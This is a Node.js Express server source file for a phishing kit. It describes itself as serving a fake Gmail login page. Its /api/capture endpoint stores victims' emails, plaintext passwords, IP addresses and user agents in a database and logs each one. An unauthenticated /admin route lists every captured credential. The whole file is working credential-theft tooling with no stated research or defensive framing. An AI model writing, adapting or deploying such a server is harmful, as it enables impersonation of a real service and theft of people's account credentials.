const express = require('express');
const path = require('path');
const cors = require('cors');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (the fake Gmail page)
app.use(express.static(path.join(__dirname, 'public')));

// API endpoint to capture credentials
app.post('/api/capture', (req, res) => {
  const { email, password } = req.body;
  const referrer = req.headers['referer'] || '';
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';

  if (email && password) {
    const stmt = db.prepare(
      'INSERT INTO credentials (email, password, referrer, user_agent, ip_address) VALUES (?, ?, ?, ?, ?)'
    );
    stmt.run(email, password, referrer, userAgent, ip);

    console.log(`[CAPTURED] ${email} | ${password} | IP: ${ip}`);
    res.json({ success: true, message: 'Credentials received' });
  } else {
    res.status(400).json({ success: false, message: 'Missing fields' });
  }
});

// Optional: admin panel to view captured creds
app.get('/admin', (req, res) => {
  const rows = db.prepare('SELECT * FROM credentials ORDER BY timestamp DESC').all();
  res.json(rows);
});

// Fallback: serve the fake Gmail page for any other route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Phishing server running on http://localhost:${3000}`);
  console.log(`Admin panel: http://localhost:${3000}/admin`);
});
